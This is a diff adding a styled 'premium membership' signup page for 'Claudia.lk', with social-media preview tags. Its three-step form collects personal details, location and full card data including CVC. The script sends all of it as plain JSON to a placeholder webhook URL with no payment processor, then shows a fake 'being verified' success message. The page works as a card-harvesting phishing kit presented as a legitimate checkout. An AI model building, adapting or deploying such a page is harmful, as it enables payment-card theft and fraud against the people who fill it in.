@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Exclusive Membership Access">
+    <meta property="og:description" content="Join Claudia.lk's premium community">
+    <meta property="og:image" content="https://example.com/claudia-profile.jpg">
+    <meta property="og:url" content="https://yourdomain.com">
+    <title>Premium Membership Signup</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --secondary: #8b5cf6;
+            --accent: #ec4899;
+            --glass: rgba(255, 255, 255, 0.1);
+            --dark: #0f0f1a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--dark), #1a1a2f);
+            color: white;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated background elements */
+        .bg-element {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(60px);
+            opacity: 0.15;
+            z-index: -1;
+            animation: float 15s infinite ease-in-out;
+        }
+
+        #bg1 {
+            width: 300px;
+            height: 300px;
+            background: var(--primary);
+            top: 20%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+
+        #bg2 {
+            width: 400px;
+            height: 400px;
+            background: var(--secondary);
+            bottom: 15%;
+            right: 10%;
+            animation-delay: 2s;
+        }
+
+        #bg3 {
+            width: 200px;
+            height: 200px;
+            background: var(--accent);
+            top: 60%;
+            left: 30%;
+            animation-delay: 4s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(20px, 20px); }
+        }
+
+        nav {
+            padding: 1.5rem 5%;
+            backdrop-filter: blur(10px);
+            background: var(--glass);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 600;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .container {
+            margin-top: 100px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 100px);
+            padding: 2rem;
+        }
+
+        .form-container {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            width: 100%;
+            max-width: 600px;
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .form-header {
+            padding: 2rem;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 3px;
+            margin-top: 1.5rem;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 3px;
+        }
+
+        .form-body {
+            padding: 2rem;
+        }
+
+        .form-step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            color: white;
+            transition: all 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(99, 102, 241, 0.3);
+        }
+
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 0 2rem 2rem;
+        }
+
+        button {
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-next {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+        }
+
+        .btn-next:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(99, 102, 241, 0.4);
+        }
+
+        .btn-prev {
+            background: transparent;
+            color: rgba(255,255,255,0.7);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .btn-prev:hover {
+            background: rgba(255,255,255,0.05);
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 1.2rem;
+            font-size: 1.1rem;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 4rem 2rem;
+            display: none;
+        }
+
+        .success-message i {
+            font-size: 4rem;
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+            animation: bounce 1s;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+                margin-top: 80px;
+            }
+            
+            .form-container {
+                border-radius: 15px;
+            }
+            
+            .form-header, .form-body, .form-footer {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated background elements -->
+    <div class="bg-element" id="bg1"></div>
+    <div class="bg-element" id="bg2"></div>
+    <div class="bg-element" id="bg3"></div>
+
+    <nav>
+        <div class="logo">Premium Access</div>
+        <div class="nav-links">
+            <a href="#" class="nav-item">Home</a>
+            <a href="#" class="nav-item">Features</a>
+            <a href="#" class="nav-item">Contact</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="form-container">
+            <div class="form-header">
+                <h2>Complete Your Registration</h2>
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+            </div>
+
+            <div class="form-body">
+                <!-- Step 1: Personal Info -->
+                <div class="form-step active" id="step1">
+                    <div class="input-group">
+                        <label for="fullname">Full Name</label>
+                        <input type="text" id="fullname" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="phone">Phone Number</label>
+                        <input type="tel" id="phone" required>
+                    </div>
+                </div>
+
+                <!-- Step 2: Location Info -->
+                <div class="form-step" id="step2">
+                    <div class="input-group">
+                        <label for="country">Country</label>
+                        <select id="country" required>
+                            <option value="">Select Country</option>
+                            <option value="US">United States</option>
+                            <option value="UK">United Kingdom</option>
+                            <option value="CA">Canada</option>
+                            <option value="AU">Australia</option>
+                            <option value="FR">France</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label for="city">City</label>
+                        <input type="text" id="city" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="zip">ZIP/Postal Code</label>
+                        <input type="text" id="zip" required>
+                    </div>
+                </div>
+
+                <!-- Step 3: Payment Info -->
+                <div class="form-step" id="step3">
+                    <div class="input-group">
+                        <label for="cardnumber">Card Number</label>
+                        <input type="text" id="cardnumber" placeholder="1234 5678 9012 3456" required>
+                    </div>
+                    <div class="input-group" style="display: flex; gap: 1rem;">
+                        <div style="flex: 1;">
+                            <label for="expiry">Expiry Date</label>
+                            <input type="month" id="expiry" required>
+                        </div>
+                        <div style="flex: 1;">
+                            <label for="cvc">CVC</label>
+                            <input type="text" id="cvc" placeholder="123" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label for="cardname">Name on Card</label>
+                        <input type="text" id="cardname" required>
+                    </div>
+                </div>
+
+                <!-- Success Message -->
+                <div class="success-message" id="success">
+                    <i class="fas fa-check-circle"></i>
+                    <h2>Registration Complete!</h2>
+                    <p>Thank you for joining Claudia.lk's premium community</p>
+                    <p>Your account is being verified and you'll receive access shortly</p>
+                </div>
+            </div>
+
+            <div class="form-footer">
+                <button class="btn-prev" id="prevBtn" disabled>Previous</button>
+                <button class="btn-next" id="nextBtn">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const steps = document.querySelectorAll('.form-step');
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const progress = document.getElementById('progress');
+        let currentStep = 0;
+
+        // Update form steps
+        function updateForm() {
+            steps.forEach((step, index) => {
+                step.classList.toggle('active', index === currentStep);
+            });
+
+            prevBtn.disabled = currentStep === 0;
+            nextBtn.textContent = currentStep === steps.length - 2 ? 'Complete Payment' : 'Next';
+            
+            if (currentStep === steps.length - 1) {
+                document.querySelector('.form-footer').style.display = 'none';
+            } else {
+                document.querySelector('.form-footer').style.display = 'flex';
+            }
+
+            // Update progress bar
+            progress.style.width = `${(currentStep / (steps.length - 1)) * 100}%`;
+        }
+
+        // Next button click
+        nextBtn.addEventListener('click', () => {
+            // Validate current step before proceeding
+            if (!validateStep(currentStep)) return;
+
+            if (currentStep < steps.length - 2) {
+                currentStep++;
+                updateForm();
+            } else if (currentStep === steps.length - 2) {
+                // Last step before submission
+                if (validateStep(currentStep)) {
+                    submitForm();
+                }
+            }
+        });
+
+        // Previous button click
+        prevBtn.addEventListener('click', () => {
+            if (currentStep > 0) {
+                currentStep--;
+                updateForm();
+            }
+        });
+
+        // Validate current step
+        function validateStep(stepIndex) {
+            const currentStepInputs = steps[stepIndex].querySelectorAll('input, select');
+            let isValid = true;
+
+            currentStepInputs.forEach(input => {
+                if (!input.value.trim()) {
+                    input.style.borderColor = 'var(--accent)';
+                    isValid = false;
+                    setTimeout(() => {
+                        input.style.borderColor = 'rgba(255,255,255,0.1)';
+                    }, 2000);
+                }
+            });
+
+            return isValid;
+        }
+
+        // Submit form data
+        async function submitForm() {
+            const formData = {
+                personal: {
+                    name: document.getElementById('fullname').value,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value
+                },
+                location: {
+                    country: document.getElementById('country').value,
+                    city: document.getElementById('city').value,
+                    zip: document.getElementById('zip').value
+                },
+                payment: {
+                    card: document.getElementById('cardnumber').value,
+                    expiry: document.getElementById('expiry').value,
+                    cvc: document.getElementById('cvc').value,
+                    name: document.getElementById('cardname').value
+                }
+            };
+
+            try {
+                // Show loading state
+                nextBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                nextBtn.disabled = true;
+
+                // Send to webhook
+                const response = await fetch('YOUR_WEBHOOK_URL', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    currentStep++;
+                    updateForm();
+                    document.getElementById('success').style.display = 'block';
+                } else {
+                    throw new Error('Submission failed');
+                }
+            } catch (error) {
+                alert('There was an error processing your request. Please try again.');
+                nextBtn.innerHTML = 'Complete Payment';
+                nextBtn.disabled = false;
+                console.error('Error:', error);
+            }
+        }
+
+        // Initialize form
+        updateForm();
+    </script>
+</body>
+  </html>
